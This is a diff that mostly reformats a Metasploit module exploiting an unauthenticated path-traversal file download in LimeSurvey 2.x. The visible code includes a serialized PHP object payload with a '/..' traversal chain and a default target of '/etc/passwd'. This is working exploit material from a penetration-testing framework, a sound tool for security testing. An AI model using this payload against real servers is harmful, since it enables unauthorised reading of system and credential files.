@@ -1,47 +1,52 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 # for extracting files
 require 'zip'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Limesurvey Unauthenticated File Download",
-      'Description'    => %q{
-        This module exploits an unauthenticated file download vulnerability
-        in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded
-        as a ZIP and unzipped automatically, thus binary files can be downloaded.
-      },
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Limesurvey Unauthenticated File Download',
+        'Description' => %q{
+          This module exploits an unauthenticated file download vulnerability
+          in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded
+          as a ZIP and unzipped automatically, thus binary files can be downloaded.
+        },
+        'Author' => [
           'Pichaya Morimoto', # Vulnerability Discovery
           'Christian Mehlmauer' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20151022-0_Lime_Survey_multiple_critical_vulnerabilities_v10.txt'],
-          ['URL', 'https://www.limesurvey.org/en/blog/76-limesurvey-news/security-advisories/1836-limesurvey-security-advisory-10-2015'],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-lime-survey/'],
+          ['URL', 'https://www.limesurvey.org/blog/22-security/136-limesurvey-security-advisory-10-2015'],
           ['URL', 'https://github.com/LimeSurvey/LimeSurvey/compare/2.06_plus_151014...2.06_plus_151016?w=1']
         ],
-      'DisclosureDate' => 'Oct 12 2015'))
+        'DisclosureDate' => '2015-10-12',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETURI', [true, "The base path to the limesurvey installation", '/']),
+        OptString.new('TARGETURI', [true, 'The base path to the limesurvey installation', '/']),
         OptString.new('FILEPATH', [true, 'Path of the file to download', '/etc/passwd']),
         OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 15])
-      ], self.class)
+      ]
+    )
   end
 
   def filepath
@@ -53,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def payload
-    traversal = "/.." * traversal_depth
+    traversal = '/..' * traversal_depth
     file = "#{traversal}#{filepath}"
     serialized = 'a:1:{i:0;O:16:"CMultiFileUpload":1:{s:4:"file";s:' + file.length.to_s + ':"' + file + '";}}'
     Rex::Text.encode_base64(serialized)
